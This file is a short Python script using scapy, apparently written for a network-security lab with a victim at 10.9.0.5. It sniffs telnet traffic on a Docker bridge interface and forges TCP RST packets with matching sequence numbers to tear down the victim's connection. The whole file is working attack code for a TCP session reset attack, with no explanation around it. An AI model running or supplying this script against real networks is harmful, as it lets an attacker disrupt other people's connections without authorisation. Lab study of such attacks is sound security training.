from scapy.all import *
import subprocess

ip_victim = "10.9.0.5"
IFACE = subprocess.run(["ifconfig | grep br- | cut -d: -f1"], shell = True, capture_output=True, text= True).stdout
print(f"Listen on {IFACE}")


def send_rst(pkt):
    pkt.show()
    if pkt[IP].src == ip_victim:
        print("capture a packet")
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)

        if Raw in pkt:
            pay_len = len(pkt[Raw].load)
        else:
            pay_len = 0


        seq_num = pkt[TCP].ack
        ack_num = pkt[TCP].seq + pay_len

        tcp = TCP(
            sport=pkt[TCP].dport,
            dport=pkt[TCP].sport,
            flags="R",             
            seq=seq_num,
            ack=ack_num,
        )

        rst_pkt = ip / tcp

        rst_pkt.show()

        print("Sending RST packet...")
        send(rst_pkt, iface=IFACE, verbose=1)
        print("Packet correctly sent")
        exit(0)

pkt = sniff(iface=IFACE, filter='tcp and src port 23', prn = send_rst)
